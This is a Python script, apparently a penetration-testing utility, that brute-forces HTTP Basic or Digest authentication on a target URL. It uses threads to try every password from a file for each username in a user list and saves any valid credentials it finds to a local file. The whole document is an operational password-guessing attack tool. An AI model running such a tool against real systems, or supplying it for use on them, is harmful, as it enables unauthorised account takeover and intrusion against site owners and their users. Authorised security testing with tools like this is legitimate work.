#!/usr/bin/python

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"
threads = 5
proxy = { "http"  : "http://127.0.0.1:8080", "https" : "https://127.0.0.1:8080" }


def banner():
    print("***************************\n Bruteforce HTTP Authentication")

def usage():
    print ("Usage: ")
    print ("    -t: target (https://test.com)")
    print ("    -u: file with usernames")
    print ("    -p: file with passwords")
    print ("    -m: method (basic or digest)")
    print ("Example: brute.py -t http://test.com -u admin -p passwords.txt -m method")

class request_performer(Thread):
    def __init__(self,passwd,user,url,method):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method

    def run(self):
        # r = {}
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    res = requests.get(self.url, auth=(self.username, self.password)) #proxies=proxy
                elif self.method == "digest":
                    res = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password)  )


                if res.status_code == 200:
                    hit = "0"
                    print(f"\n[+] Password Found: {self.username}:{self.password}")
                    
                    with open("found_credentials.txt", "a") as f:
                            f.write(f"{self.username}:{self.password}\n")
                        
                    sys.exit()
                else:
                    # overwrite line
                    # sys.stdout.write("\r" + " " * len(output) + "\r")
                    # sys.stdout.flush()
                    i[0] -= 1

            except Exception as e:
                print (e)                  


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:t:p:m:")
    except getopt.GetoptError:
        print("[!!] Error on Arguments!")
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            users_file = arg
        elif opt == '-t':
            url = arg
        elif opt == '-p':
            passwords_file = arg
        elif opt == '-m':
            method = arg

    try:
        with open(passwords_file, "r") as f:
            passwords = f.readlines()
    except:
        print("[!!] Password file doesn't exist!")
        sys.exit()

    try:
        with open(users_file, "r") as f:
            usernames = [line.strip() for line in f.readlines()]
    except:
        print("[!!] User file doesn't exist!")
        sys.exit()

    for username in usernames:
        print(f"[*] Trying user: {username}")
        launcher_threads(passwords.copy(), threads, username, url, method)

def launcher_threads(passwords, threads, username, url, method):
    global i, hit
    i = [0]
    hit = "1"
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] += 1
                    thread = request_performer(passwd, username, url, method)
                    thread.start()
            except KeyboardInterrupt:
                print("[!!] Interrupted!")
                sys.exit()
            thread.join()
        if hit == "0":
            print("[+] Attack finished for user:", username)
            return
        

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print ("[!!] Interupted")    
